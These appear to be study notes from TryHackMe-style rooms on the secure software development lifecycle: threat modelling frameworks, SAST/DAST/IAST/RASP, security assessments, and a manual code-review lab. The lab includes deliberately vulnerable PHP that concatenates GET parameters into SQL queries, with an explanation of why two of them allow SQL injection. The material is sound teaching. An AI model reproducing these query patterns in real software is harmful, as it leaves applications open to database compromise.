For example, suppose there are services with assigned business criticality levels. In that case, you can say that if a bug affects a business-critical service (an authentication service, a payment infrastructure etc.), you will assign 5 points. This highlights why it is vital to understand a security posture and its processes. Measuring risk and priority with an endemic equation to a company's services will have great results. An example of a Quantitative Risk Assessment Matrix can be seen below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61a7523c029d1c004fac97b3/room-content/e5fb607dfd764c3e162da1783dd58e02.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61a7523c029d1c004fac97b3/room-content/e5fb607dfd764c3e162da1783dd58e02.png)

Risk assessments are better performed at the beginning of the SDLC, during the planning and requirement phases. For example, "Customer data gets exfiltrated by an attack". Once the system is developed, you can perform quantitative risk analysis: "One customer can sue us for $ 20,000 if their data gets leaked", and we have 100 customers. However, the Annual Rate of Occurrence (ARO) is 0.001. Hence Annual Loss Expectancy is = $20,000 * 100 * 0.001 = $ 2,000, meaning as long as our compensating security control is less than $ 2,000, we are not overspending on security.

# **Threat Modelling**

Threat modelling is best integrated into the design phase of an SDLC before any code is written. Threat modelling is a structured process of identifying potential security threats and prioritising techniques to mitigate attacks so that data or assets that have been classified as valuable or of higher risk during risk assessment, such as confidential data, are protected. When performed early, it brings a great advantage; potential issues can be found early and solved, saving fixing costs down the line.

There are various methods to perform threat modelling. Not all the methods have the same purpose; some focus on risk or privacy concerns, while some are more customer-focused. We can combine these methods to understand potential threats better; it is essential to analyse which way aligns more with the project or business. **STRIDE, DREAD, and PASTA are among the common threat modelling methodologies.**

**STRIDE**

STRIDE stands for Spoofing, Tampering, Repudiation, Information Disclosure, Denial Of Service, and Elevation/Escalation of Privilege. STRIDE is a widely used threat model developed by Microsoft which evaluates the system's design in a more detailed view. We can use STRIDE to identify threats, including the property violated by the threat and definition. The system's data flow diagram is to be developed in this model, and each node is applied with the STRIDE model. Identifying security threats is a manual process that tools are not supported and should be carried out during the risk assessment. Using data flow diagrams and integrating STRIDE, the system entities, attack surfaces, like known boundaries and attacker events become more identifiable. Stride stands for **S**poofing Identity, **T**ampering with Data, **R**epudiation, **I**nformation Disclosure, **D**enial of Service, **E**levation of **P**rivilege. STRIDE is built upon the CIA triad principle (Confidentiality, Integrity & Availability). Security professionals that perform STRIDE are looking to answer "What could go wrong with this system". Here are the components of the framework:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61a7523c029d1c004fac97b3/room-content/a5904cf6f063a62e77df6623eb1cbd33.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61a7523c029d1c004fac97b3/room-content/a5904cf6f063a62e77df6623eb1cbd33.png)

1. **Spoofing:** It is an act of impersonation of a user by a malicious actor which violates the authentication principle from the perspective of the CIA triad. Common ways include ARP, IP, and DNS spoofing.
2. **Tampering:** The modification of information by an unauthorised user. It violates the integrity principle of the CIA triad.
3. **Repudiation:** Not taking responsibility for events where the actions are not attributed to the attacker. It violates the principle of non-repudiability. For example, the attacker clears up all the logs that could lead to leaving traces.
4. **Information Disclosure:** It is an act of violation of confidentiality of the CIA triad. A typical example is data breaches.
5. **Denial of Service:** Denial of Service occurs when an authorised user cannot access the service, assets, or system due to the exhaustion of network resources. DoS is a violation of the availability principle of the CIA triad.
6. **Elevation/Escalation of Privilege:** Escalating privileges to gain unauthorised access is a classic example of a violation of the authorisation principle of the CIA triad.

**DREAD**

The abbreviation DREAD stands for five questions about each potential: **D**amage Potential, **R**eproducibility, **E**xploitability, **A**ffected Users and **D**iscoverability. DREAD is also a methodology created by Microsoft which can be an add-on to the STRIDE model. It's a model that ranks threats by assigning identified threats according to their severity and priority. In other words, it creates a rating system that is scored based on risk probability. Without STRIDE, the DREAD model also can be used in assessing, analysing and finding the risk probability by threat rating. Here are the components of the framework:

1. **Damage:** refers to the possible damage a threat could cause to the existing infrastructure or assets. It is based on a scale of 0–10. A score of 0 means no harm, 5 means Information Disclosure, 8 means user data is compromised, 9 means internal or administrative data is compromised, and 10 means unavailability of a service.
2. **Reproducibility:** it measures the complexity of the attack. So how easily a hacker can replicate a threat. A score of 0 means it is nearly impossible to copy, 5 stands for being complex but possible, 7.5 for an authenticated user and a score of 10 means the attacker can reproduce very quickly without any authentication.
3. **Exploitability:** Referring to the attack's sophistication or how easy it would be to launch the attack. A score of 2.5 implies it would require an advanced skill set of networking and programming skills; 5 means can be exploited with available tools, a score of 9 means we would need a simple web application proxy tool and a score of 10 means it can exploit through a web browser.
4. **Affected Users:** it describes the number of users affected by the successful exploitation of a vulnerability. A score of 0 would mean that there would be no affected users, 2.5 shall mean for an individual user, 6 would mean a small group of users, 9 would mean significant users like administrative users, and 10 would imply all users are affected.
5. **Discoverability:** The process of discovering the vulnerable points in the system. For example, the threat would be easily found in case of compromise. A score of 0 would mean it would be challenging to discover it, a score of 5 means that the threat can be discovered by analysis of HTTP requests, and 8 means it can be easily found as it's public-facing. A score of 10 would mean it's visible in the browser address bar.

**PASTA**

PASTA is short for Process for Attack Simulation and Threat Analysis; it is a risk-centric threat modelling framework. PASTA's focus is to align technical requirements with business objectives. PASTA involves the threat modelling process from analysing threats to finding ways to mitigate them, but on a more strategic level and from an attacker's perspective. It identifies the threat, enumerates them, and then assigns them a score. This helps organisations find suitable countermeasures to be deployed to mitigate security threats. PASTA is divided into seven stages:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61a7523c029d1c004fac97b3/room-content/8222ed08e31753d975ec3ec3aa2e43a9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61a7523c029d1c004fac97b3/room-content/8222ed08e31753d975ec3ec3aa2e43a9.png)

1. **Define Objectives:** The first stage focuses on noting the structure and defining objectives. This makes the end goal a whole lot clearer and ensures the relevant assets are threat modelled by defining an asset scope.
2. **Define Technical Scope:** This is where architectural diagrams are defined, both logical and physical infrastructure. Helpful in mapping the attack surface and dependencies from the environment.
3. **Decomposition & Analysis:** Each asset will have a defined trust boundary that encompasses all its components and data in this stage. For example, mapping threat vectors for a payment service and evaluating which components underlying the service can be leveraged for an attack; components can be libraries, dependencies, modules or underlying services etc.
4. **Threat Analysis:** This refers to the extracted information obtained from threat intelligence. Useful to identify which applications are vulnerable to specific vectors; for example, a customer/public-facing application can be susceptible to DDOS, unauthorised data alteration etc.
5. **Vulnerabilities & Weaknesses Analysis:** it analyses the vulnerabilities of web application security controls. It identifies security flaws in the application and enumerates vulnerabilities. It is highly recommended to add mitigation to the identified threat in this stage. For example, when describing a past incident involving an exploit of a mail server, lessons learned or mitigation: lack of thorough testing before implementation and hardening the server.
6. **Attack/Exploit Enumeration & Modelling:** In this stage, we map out the possible threat landscape and the entire attack surface of our web application. We then map all potential attack vectors to the different nodes, identifying exploits and attack paths. This stage simulates all the enumerated information extracted from all of the previous steps; this helps security professionals determine the extent and probability of successfully launching the identified vulnerabilities.
7. **Risk Impact Analysis:** Based on the collective data from the previous stages, all of the scoped assets that have been affected are analysed and finally, based upon the risk analysis, recommended steps to mitigate the risks and eliminate all of the residual risks are documented.

# **Secure code review & analysis**

According to research conducted by Verizon in 2020 on Data Breaches, 43% of breaches were attacks on web applications, while some other security breaches resulted from some vulnerabilities in web applications. Implementing a secure code review in the phases of an SDLC, especially during the implementation phase, will increase the resilience and security of the product without bearing any additional cost for future patches. Secure code review is defined as a measure where the code itself is verified and validated to ensure vulnerabilities that are found can be mitigated and removed to avoid vulnerabilities and flaws. Having the developers be aware and proactive in reviewing the code during development can result in faster mitigation responses and fewer unattended threats. Reviewing code is a crucial step in the SDLC for developers. It prevents any setbacks on the release and issues exposed to the users. As shown in the previous SSDLC task, the cost of the project itself and the effort put in is proportional and cheaper in the long run than the cost of applying code reviews and analysis. By implementing this approach, the organisation will also be compliant with the standards set by government bodies and certifications.

**Code review** can be done manually or automated. A manual code review is where an expert analyses and checks the source code by going line by line to identify vulnerabilities. Therefore, a high-quality manual code review requires the expert to communicate with the software developers to get hold of the purpose and functionalities of the application. The analysis output will then be reported to the developers if there is a need for bug fixing.

**Code Analysis**

Static analysis examines the source code without executing the program. In contrast, Dynamic analysis looks at the source

code when the program is running, static analysis detects bugs at the implementation level, and dynamic analysis detects errors during program runtime. Automated Static Application Security Testing (SAST) automatically analyses and checks the source code.

SAST

SAST means Static Application Security Testing, a white box testing method that directly analyses the source code.

Many
 people tend to develop an application that could automate or execute 
processes quickly and improve performance and user experience, thereby 
forgetting the negative impact an application that lacks security could 
cause.

**Why is it Static?** - Because the test is done before an application is live and running. SAST
 can even help detect vulnerabilities in your application before the 
code is merged or integrated into the software if added as part of the 
SDLC development phase.

**How Does SAST Work**

SAST
 uses a testing methodology of analysing a source code to detect any 
traces of vulnerabilities that could provide a backdoor for an attacker.
 SAST usually analyses and scans an application before the code is 
compiled.

The process of SAST
 is also known as White Box Testing. Once a vulnerability is detected, 
the following line of action is to check the code and patch the code 
before the code is compiled and deployed to live. White
 Box Testing is an approach or method that testers use to test 
software's inner structure and see how it integrates with the external 
systems.

# Bonus:

To summarise, SAST
 is used to scan source code for security vulnerabilities. Another type 
of testing goes hand in hand with SAST, Software Composition Analysis 
(SCA). SCA is used to scan dependencies for security vulnerabilities, 
helping development teams track and analyse any open-source component 
brought into a project. SCA is now an essential pillar in security 
testing as modern applications are increasingly composed of open-source 
code. Nowadays, one of the biggest challenges developer teams have is 
ensuring their codebase is secure as applications are assembled from 
different building blocks.

# DAST

DAST means Dynamic Application Security Testing, a black-box testing method that finds vulnerabilities at runtime. DAST is a tool to scan any web application to find security vulnerabilities. This tool is used to detect vulnerabilities inside a web application that has been deployed to production. DAST tools will always send alerts to the security team assigned for immediate remediation.

How Does DAST Work

DAST
 works by simulating automated attacks on an application, mimicking a 
malicious attacker. The goal is to find unexpected outcomes or results 
that attackers could use to compromise an application. Since DAST tools 
don't have internal information about the application or the source 
code, they attack just as an external hacker would—with the same limited
 knowledge and information about the application.

DAST is a tool that can be integrated very early into the software development lifecycle. Its focus is to help organisations reduce and protect against the risk that application vulnerabilities could cause. It is very different from SAST because DAST uses the Black Box Testing Methodology; it conducts its vulnerability assessment outside as it does not have access to the application source code. DAST is typically used during the testing phase of SDLC.

# IAST

IAST means Interactive Application Security Testing that analyses code for security vulnerabilities while the app is running. It is usually deployed side by side with the main application on the application server. IAST is an application security tool designed for web and mobile applications to detect and report issues even while running. Before someone can fully comprehend IAST's understanding, the person must know what SAST and DAST mean. IAST was developed to stop all the limitations in both SAST and DAST. It uses the Grey Box Testing Methodology.

**How Does IAST Work**
IAST testing occurs in real-time, just like DAST, while the application runs in the staging environment. IAST can identify the line of code causing security issues and quickly inform the developer for immediate remediation. IAST checks the source code similar to SAST, but at the post-build stage, unlike SAST, which occurs during development. IAST agents are typically deployed on the application servers. When the DAST scanner performs its work by reporting a vulnerability, the deployed IAST agent will now return a line number of the issue from the source code. Can deploy IAST agents on an application server. During functional testing performed by a QA tester, the agent studies every pattern that a data transfer inside the application follows regardless of whether it's dangerous. For example, if data is coming from a user and the user wants to perform an SQL Injection on the application by appending an SQL query to a request, the request will be flagged as dangerous.

# *Bonus: RASP*

"RASP" stands for Runtime Application Self Protection. RASP is a runtime application integrated into an application to analyse inward and outward traffic and end-user behavioural patterns to prevent security attacks. This tool is different from the other tools as RASP is used after product release, making it a more security-focused tool when compared to the others that are known for testing.

**How does RASP work**
RASP is deployed to a web or application server next to the main application while running to monitor and analyse the inward and outward traffic behaviour. Immediately once an issue is found, RASP will send alerts to the security team and immediately block access to the individual making a request. When you deploy RASP, it will secure the whole application against different attacks. It does not just wait or try to rely only on specific signatures of some known vulnerabilities.

RASP is a complete solution that observes every detail of different attacks on your application and knows your application behaviour.

# Choosing tools

SAST, DAST, and IAST are great tools that complement each other. A key strength of DAST
 is that it identifies runtime issues—weaknesses that aren't 
discoverable when an application isn't running. SAST is excellent at 
identifying vulnerabilities while code is being written. Additionally, 
DAST looks at how an application responds to an attack, providing 
helpful insight into how likely it would be for that vulnerability to be
 manipulated. AST enables DevSecOps and supports continuous testing, 
monitoring, assessment, and validation in real-time. IAST helps 
prioritise and alert on vital critical risks, as defined by business 
goals and application security needs. The security experts always 
support using two or more of these tools to ensure better coverage, 
which will lower the risk of vulnerabilities in production. Ensure you 
fit these tools to the way engineers push code and interact with the 
pipeline; watch out for integrations and focus on providing support and 
education vs being a blocker. For example, if choosing SAST, you can 
integrate it when engineers push code, and they can get feedback on the 
PR before merging.

# Timeline of Application Security Automation

Check the diagram below to see where you can fit security testing tools!

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61a7523c029d1c004fac97b3/room-content/ed41446ac19972111b12a8b41bdb3599.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61a7523c029d1c004fac97b3/room-content/ed41446ac19972111b12a8b41bdb3599.png)

Above is a standard timeline when choosing when to implement security testing tooling. As described earlier, SAST
 is a static approach; there is no need for a running application. 
Therefore, SAST can be implemented in the earliest development stages. 
SCA typically work best for Identifying open source components, like 
packages via dependencies. It is also beneficial for identifying 
open-source licenses being used, especially from a legal risk 
perspective. Because of this, you can implement governance and control 
by enforcing security and license policies across the different stages 
of SDLC.

On the other hand, DAST
 relies on the execution of the application, so integrating it in the 
pipeline is not as straightforward as SAST. DAST is typically 
implemented after the acceptance stage of the code and pre-production 
stage. This is where the application starts running in testing 
environments (e.g. sandbox/staging) similar to IAST. DAST and IAST 
reside on the far right of your pipeline because the execution of your 
application is required for DAST tools to do their work. This can become
 quite time-consuming, significantly if your application has grown over 
time. RASP helps uncover third-party packages and associated 
vulnerabilities at runtime, more effectively enabling developers to 
prioritise the remediation and mitigation of their highest pressing 
vulnerabilities. This is usually enabled in the production stage as 
security vulnerabilities are evaluated during the runtime of the 
application.

# **Security Assessment**

A security assessment plays a primary role in achieving security in SDLC and should be implemented in all phases where possible. Security testing assesses a system, software or web application for vulnerabilities and other attack vectors. Because they test from a holistic point of view of the application, they are usually carried out at the end of the SDLC, in the Operations and Maintenance phase, once the version has included all the working components and updates. There are two types of assessments: Penetration Testing and Vulnerability Assessment. **Usually, a company employs and authorises external security testers to attempt to break into a company’s network and systems legally.**

**Vulnerability Assessment**

Vulnerability
 Assessments focus on Finding Vulnerabilities, but do not validate them 
or simulate the findings to prove they are exploitable in reality. 
Typically, automated tools run against an organisation's network and 
systems. Examples of tools: are OpenVAS, Nessus (Tenable), and ISS 
Scanner. These scanners probe ports and services on systems across 
various systems and IP Addresses. Other activities include checking 
service versions against a database of vulnerabilities affecting said 
version. The result is a report with a list of vulnerabilities usually 
found, with an automated threat level severity classification, e.g., 
High/Medium/Low or an assigned CVSS score.

**Penetration Testing**

It Includes Vulnerability Testing but goes more in-depth. It is extended by testing/validating of vulnerabilities, quantifying risks and attempting to penetrate systems. For example, trying to escalate privileges after a vulnerability is found, some vulnerabilities can be a lower risk but can be used as leverage to cause more damage. The tester can provide a thorough report with suggested countermeasures to mitigate the vulnerabilities. This makes it easier to understand the threats by demonstrating the actual risk, for example, recovering an employee password by exploiting the mentioned vulnerability.

**Pros and Cons**

**Vulnerability Assessment**

| Pros | Cons |
| --- | --- |
| • Suitable for quickly identifying potential vulnerabilities | • Can produce a large number of reports |
| • Part of the Penetration Test | • Quality depends on the tool used |
| • Better for Budget, they are cheaper than Pentests | • Real-life scenarios for vulnerabilities are not considered (it could be behind a proxy or only exploitable with social engineering/credentials) |
|  | • The low-risk vulnerability may be used as part of a more powerful attack. |

**Penetration testing**

| Pros | Cons |
| --- | --- |
| Tester shows organisations what an attacker could do. | Very Expensive |
| How any vulnerabilities could be used against it by attackers – the real risk | Requires extensive planning and time to carry out the tests |
| Can be shown to the customer |  |

## SSDLC Methodologies

You can follow different methodologies to integrate security in the SDLC best. Before we dive into each method., regardless of the chosen development methodology (Agile, DevOps, Extreme Waterfall, etc.), there is a need to:

- Build with security in mind
- Introduce testing focused on security

There are several methodologies for SDLC; some examples of widely used methodologies are:

- Microsoft's Security Development Lifecycle (SDL)
- OWASP Secure Software Development Life Cycle Project (S-SDLC)
- Software Security Touchpoints

Microsoft's SDL

### SDL principles:

- Secure by Design: Security is a built-in quality attribute affecting the whole software lifecycle.
- Security by Default: Software systems are constructed to minimise potential harm caused by attackers, e.g. software is deployed with the least necessary privilege.
- Secure in Deployment: software deployment is accompanied by tools and guidance supporting users and administrators.
- Communications: software developers are prepared for occurring threats by communicating openly and timely with users and administrators

SDL is a collection of mandatory security activities grouped by the traditional software development lifecycle phases. Data is collected to assess training effectiveness. In-process metrics are used to confirm process compliance. Post-release metrics are used to guide future changes. SDL places heavy emphasis on understanding the cause and effect of security vulnerabilities. A development team must complete the mandatory security activities to comply with the Microsoft SDL process. You can implement SDL by following these practices:

| **Practice** | **Why?** |
| --- | --- |
| **Provide Training** | Engineers,
 program and product managers must understand security basics and know 
how to build security into software and services to make products more 
secure while still addressing business needs and delivering user value. Practical training will complement and re-enforce security policies, SDL
 practices, standards, and software security requirements and be guided 
by insights derived through data or newly available technical 
capabilities. |
| **Define Security Requirements** | Considering
 security and privacy is a fundamental aspect of developing highly 
secure applications and systems. Regardless of the development 
methodology being used, must continually update security requirements to
 reflect changes in required functionality and changes to the threat 
landscape. |
| **Define Metrics and Compliance Reporting** | It
 is essential to define the minimum acceptable levels of security 
quality and hold engineering teams accountable for meeting those 
criteria. Defining these early helps a team understand risks associated 
with security issues, identify and fix security defects during 
development, and apply the standards throughout the entire project. |
| **Perform Threat Modeling** | This
 practice allows development teams to consider, document, and discuss 
the security implications of designs in their planned operational 
environment and in a structured fashion. Applying
 a structured approach to threat scenarios helps a team more effectively
 and less expensively identify security vulnerabilities, determine risks
 from those threats, make security feature selections and establish 
appropriate mitigations. |
| **Establish Design Requirements** | The SDL
 is typically thought of as assurance activities that help engineers 
implement "secure features", in that the features are well-engineered 
concerning security. Engineers will normally rely on security features, 
such as cryptography, authentication, logging, etc. In many cases, the 
selection or implementation of security features has proven so 
complicated that design or implementation choices are likely to result 
in vulnerabilities. Therefore, it's crucially essential to apply these 
consistently and with a consistent understanding of their protection. |
| **Define and Use Cryptography Standards** | It's
 critically important to ensure all data, including security-sensitive 
information and management and control data, is protected from 
unintended disclosure or alteration when transmitted or stored. 
Encryption is typically used to achieve this. E.g., only use industry-vetted encryption libraries and ensure they're implemented to allow them to be easily replaced if needed. |
| **Manage the Security Risk of Using Third-Party Components** | When
 selecting third-party components to use, it's essential to understand 
the impact of a security vulnerability on the security of the more 
extensive system into which they are integrated. Having an accurate 
inventory of third-party components and a plan to respond when new 
vulnerabilities are discovered will go a long way toward mitigating this
 risk. |
| **Use Approved Tools** | Define
 and publish a list of approved tools and their associated security 
checks, such as compiler/linker options and warnings. Engineers should 
strive to use the latest version of approved tools, such as compiler 
versions, and take advantage of new security analysis functionality and 
protections. |
| **Perform  Security Testing (SAST, DAST, IAST)** | Analysing
 the source code before compilation provides a highly scalable method of
 security code review and helps ensure that secure coding policies are 
being followed. The same goes for performing
 run-time verification of your fully compiled or packaged software 
checks functionality that is only apparent when all components are 
integrated and running. |
| **Perform Security Assessments: Vulnerability Assessment & Penetration Testing** | The
 objective of a penetration test is to uncover potential vulnerabilities
 resulting from coding errors, system configuration faults, or other 
operational deployment weaknesses. As such, the test typically finds the
 widest variety of vulnerabilities. |
| **Establish a Standard Incident Response Process** | Preparing an Incident Response Plan is crucial for helping to address new threats that can emerge over time. The
 plan should include whom to contact in case of a security emergency and
 establish the protocol for security servicing, including methods for 
code inherited from other groups within the organisation and for 
third-party code.  |

OWASP's S-SDLC

### S-SDLC Principles

- SDL is a collection of mandatory security activities grouped by the traditional software development lifecycle phases.
- Data is collected to assess training effectiveness.
- In-process metrics are used to confirm process compliance.
- Post-release metrics are used to guide future changes.
- SDL places heavy emphasis on understanding the cause and effect of security vulnerabilities.
- A development team must complete the sixteen mandatory security activities to comply with the Microsoft SDL process.
    
    ![https://tryhackme-images.s3.amazonaws.com/user-uploads/61a7523c029d1c004fac97b3/room-content/1e76d9be1c116a8d68925162aa3b01f0.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61a7523c029d1c004fac97b3/room-content/1e76d9be1c116a8d68925162aa3b01f0.png)
    

OWASP

S-SDLC aims to build "security quality gates", to support quality and 
secure software made throughout the pipeline. This is done by following 
an Agile Security approach, where sprints are dedicated to security. 
Examples of Sprints can include: Code reviews, authentication, 
authorisation, input validation, and assessing technical risks like code
 injections. The gates comprise sprints focusing on similar building 
blocks like those seen in Microsoft SDL. OWASP S-SDLC Agile approach is 
heavily influenced and based on a "Maturity Model" approach, in 
particular OWASP SAMM. The Software Assurance Maturity Model (SAMM) is 
an open framework to help organisations formulate and implement a 
software security strategy tailored to the organisation's specific 
risks. It helps to evaluate an organisation's existing software security
 practices, build a software security assurance program, demonstrate 
improvements to that program, and define and measure security activities
 for an organisation. SAMM helps explain objectives, actions, results, 
success metrics, costs etc. An example would be a security scorecard for
 gap analysis, for instance, in a particular area, like endpoint 
protection. It aims to answer "How well are we doing and where do we 
want to get to?".

[OWASP SAMM link](https://owasp.org/www-project-samm/)

Another critical security model is the Building Security In Maturity Model (BSIMM). BSIMM is a study of real-world software security initiatives and reflects the current state of software security. BSIMM
 can be described as a "measuring stick" to understand your security 
posture by providing a comparison of other companies' security states. 
In other words, it does not tell you what you should do but rather what 
you are doing wrong. There are hundreds of organisations involved. [BSIMM link](https://owaspsamm.org/blog/2020/10/29/comparing-bsimm-and-samm/)

## **STATIC APPLICATION SECURITY TESTING (SAST)**

**Code Review**

One of the methods used
 for developing secure applications is frequently testing the code for 
security bugs through a process known as code review. Code reviews 
consist of looking at the source code of an application to search for 
possible vulnerabilities using a white box approach. By having access to
 the code, the reviewer can guarantee a greater coverage of the 
application's functionalities and lower the time required to find bugs.

If
 left unattended, vulnerabilities introduced early in the development 
process will propagate to the end of a project, where resolution is more
 laborious and costly. Code reviews will attempt to detect such 
vulnerabilities early when they are easier to fix.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1e9aa4ddd5746ee00e0ad76d30208eb5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1e9aa4ddd5746ee00e0ad76d30208eb5.png)

# Manual vs Automated Code Review

Code reviews are often done through a combination of manual analysis 
and automated tools for the best results. Both approaches have 
advantages that need to be considered when deciding what is best at each
 stage of the development lifecycle.

On the one hand, manual code reviews have the advantage of a human 
evaluating the code, which allows for a thorough analysis and more 
precise results. However, since an application often has thousands and 
thousands of lines of code, the task can quickly become overwhelming for
 the reviewer, leading to some vulnerabilities being missed because of 
fatigue.

On the other hand, automated tools excel at finding common 
vulnerabilities almost instantly, saving loads of time to the reviewer. 
Automated tools will also perform consistently, no matter the size of 
the code base, so they won't miss vulnerabilities as a human could do, 
as long as they have predefined rules to match them. If the tool has no 
rules configured for a specific type of vulnerability, they are likely 
to miss those.

Another important aspect to compare is cost. The cost of a manual 
review will often be higher, as a reviewer must spend lots of time 
tracing vulnerabilities through the code. Automated tools will perform 
their analysis almost instantly.

For these reasons, you will typically want to run automated tests 
early in the development lifecycle to take care of all the low-hanging 
fruits with lower costs and have manual reviews spaced periodically or 
when important project goals are met to take care of complex 
vulnerabilities that the automated tools may not be able to detect.

**Manual Code Review**

Before
 jumping into SAST tools, we will look at how manual core reviewing is 
usually performed, as this will make it easier to understand how SAST 
tools look at code.

During this task, our goal will be to find SQL injection 
vulnerabilities in the source code of a simple application. The 
application has other vulnerabilities, but we will focus on a single 
type of vulnerability to understand how traditional code reviews are 
done and how those steps map to the analysis techniques used by SAST 
tools.

Before continuing, make sure your VM is running by pressing the green **Start Machine** button attached to this task. The VM is starting in split view. In case the machine is not visible, press the blue **Show Split View** button at the top right of this room.

For this task, the code we will be using can be found in `/home/ubuntu/Desktop/simple-webapp/`

# Searching for Insecure Functions

The first step when reviewing code is identifying potentially 
insecure functions in use. Since we are looking for SQL injections, we 
should focus on any functions that could be used to send raw queries to 
the database. Since our code uses PHP and MySQL, here are some functions
 that are typically used to send MySQL queries:

| Database Engine | Function |
| --- | --- |
| MySQL | mysqli_query()mysql_query()mysqli_prepare()query()prepare() |

A straightforward way to manually search instances of such functions 
is to use grep to check all of our project's files recursively. For 
example, to search for instances of `mysqli_query()`, go to the project's base directory and run the following command:

Linux

```
user@machine$ cd /home/ubuntu/Desktop/simple-webapp/html/user@machine$ grep -r -n 'mysqli_query('  db.php:18: $result = mysqli_query($conn, $query);
```

The `-r` option tells grep to recursively search all files under the current directory, and the `-n`
 option indicates that we want grep to tell us the number of the line 
where the pattern was found. In the above terminal output, we can see 
that a single instance of `mysqli_query()` was found on line `18`.

We have identified a line that could lead to SQL injections. However,
 just by looking at that line, we can't determine whether a 
vulnerability is present.

# Understanding the Context

Let's open `db.php` to analyse the context around the `mysqli_query()` function to see if we get a better idea of how it is used:

```php
function db_query($conn, $query){
    $result = mysqli_query($conn, $query);
    return $result;
}

```

Here we can see that `mysqli_query()` is wrapped into the `db_query()` function, and that the `$query`
 parameter is passed directly without modification. It is very common 
for functions to be nested into other functions, so simply analysing the
 local context of a function is sometimes not enough to determine if a 
vulnerability is present. We now need to trace the uses of the `db_query()` function throughout our code to identify potential vulnerabilities.

# Tracing User Inputs to Potentially Vulnerable Functions

We can use grep again to search for uses of `db_query()`:

Linux

```
user@machine$ grep -rn 'db_query('    hidden-panel.php:7:$result = db_query($conn, $sql);
    hidden-panel.php:20:$result2 = db_query($conn, $sql2);
    hidden-panel.php:23:$result3 = db_query($conn, $sql3);
    db.php:17:function db_query($conn, $query){
```

Here we get three uses for `db_query()` on `hidden-panel.php`. Once again, we can analyse the context of each call, starting with the call on line 7:

```php
$sql = "SELECT id, firstname, lastname FROM MyGuests WHERE id=".$_GET['guest_id'];
$result = db_query($conn, $sql);

```

Congrats on finding an SQL injection! Whatever is passed in the `guest_id`
 parameter via the GET method will be concatenated to a raw SQL query 
without any input sanitisation, enabling the attacker to change the 
query.

If we do a similar process for the other two uses of `db_query()`, we will have the following code:

```php
$sql2 = "SELECT id, logtext FROM logs WHERE id='".preg_replace('/[^a-z0-9A-Z"]/', "", $_GET['log_id']). "'";
$result2 = db_query($conn, $sql2);

$sql3 = "SELECT id, name FROM asciiart WHERE id=".preg_replace("/[^0-9]/", "", $_GET['art_id'], 1);
$result3 = db_query($conn, $sql3);

```

Again, we have some GET parameters being concatenated into SQL 
queries. This would give us the impression that we have two more 
vulnerabilities identified. Still, in both cases, the GET parameters are
 sanitised through `preg_replace()` using different regular 
expressions to replace any character that isn't allowed with an empty 
string. To decide if these lines of code are vulnerable, we will need to
 evaluate if the filters in place allow SQL injections to pass.

The query on `$sql2` is passed through a filter that only 
allows characters that are either alphanumeric or double-quotes. While 
double-quotes may seem like a possible vector for SQLi, they don't pose a
 threat in this case since the SQL sentence encloses the string passed 
through `$_GET['log_id']` between single-quotes ('). Since an
 attacker would have no way to escape from the string in the SQL 
sentence, we can be sure that this line isn't vulnerable.

The query on `$sql3` is even more restrictive, allowing only numeric characters to be passed through `$_GET['art_id']`. However, notice that the `preg_replace()` function is called with a third parameter set to "1". If we refer to the [manual page of the function](https://www.php.net/manual/en/function.preg-replace.php),
 we will learn that the third parameter indicates the maximum number of 
replacements to be done. Since it is set to 1, only the first character 
that isn't a number will be replaced with an empty string. Any other 
characters will pass without being replaced, enabling SQL injections. 
This line is indeed vulnerable.

# Enough Manual Reviewing

We have used manual code reviewing to identify two SQL injection 
points in our application. While the example application is quite 
straightforward, a real application has many more lines of code. Tracing
 each instance of a potentially vulnerable function will be way more 
complicated. By now, it should be evident that manually reviewing large 
code bases can quickly become a tedious task. We will now move onto 
using SAST tools to perform the same analysis for us and analyse how 
well they perform.

**Automated Code Review**

# Static Application Security Testing

Static Application Security Testing (SAST) refers to using automated 
tools for code analysis. The idea is not to replace manual code reviews 
but to provide a simple method to automate simple code checks to quickly
 find vulnerabilities during the development process without requiring a
 specialised individual.

SAST complements other techniques, such as Dynamic Application 
Security Testing (DAST) or Software Composition Analysis (SCA), to 
provide a holistic approach to application security during the 
development lifecycle. Just as with any of the other techniques, SAST 
will have its pros and cons that we need to be aware of:

| **Pros:**
• It doesn't require a running instance of the target application.
• It provides great coverage of the application's functionality.
• It runs fast as opposed to other dynamic techniques.
• SAST tools report exactly where vulnerabilities are in the code.
• Easy to integrate into your CI/CD pipeline. | **Cons:**
• The source code of an application is not always available (third-party apps).
• Prone to false positives.
• Can't identify vulnerabilities that are dynamic in nature.
• SAST tools are mostly language-specific. They can only check languages they know. |
| --- | --- |

# SAST Under the Hood

While every SAST tool is different, most of them will perform two main tasks:

1. **Transform the code into an abstract model:** SAST
tools usually ingest the source code and produce an abstract
representation for further analysis. Most SAST tools will represent the
code using Abstract Syntax Trees (AST), but some tools may have other
equivalent proprietary structures. This allows for easier code analysis
in a way that is independent of the programming language in use. This
step is crucial for later analysis, as any feature of a programming
language that isn't correctly translated into the AST will probably not
be analysed for security issues effectively.
2. **Analyse the abstract model for security issues:** Different analysis techniques will be used to search for potential vulnerabilities in the code model.

During this room, we won't cover code modelling in detail, as you 
won't have to deal with it from a user's perspective. We will instead 
focus on the different analysis techniques commonly used by SAST tools:

[Untitled Database](SECURITY%20ENGINEER%2043918b136d114e349a5335a413e9de51/Untitled%20Database%20c0dc97fd7f664bbc89cb98306acdfafc.csv)

It is important to note that not every SAST tool will implement all 
the analysis techniques we discussed, but it is good to have them as a 
reference to compare different solutions out there.

**Rechecking our Application with SAST Tools**

Now that we know how 
SAST tools work, we are ready to use a couple of them. We will use a 
simple PHP application as our target for this task. You can find the 
application's code in the `simple-webapp` folder on your desktop.

# Rechecking our Application with Psalm

We will first use **Psalm (PHP Static Analysis Linting Machine)**,
 a simple tool for analysing PHP code. The tool is already installed as 
part of the application's project, so you won't need to install it, but 
you can find installation instructions on [Psalm's online documentation](https://psalm.dev/docs/running_psalm/installation/) if required.

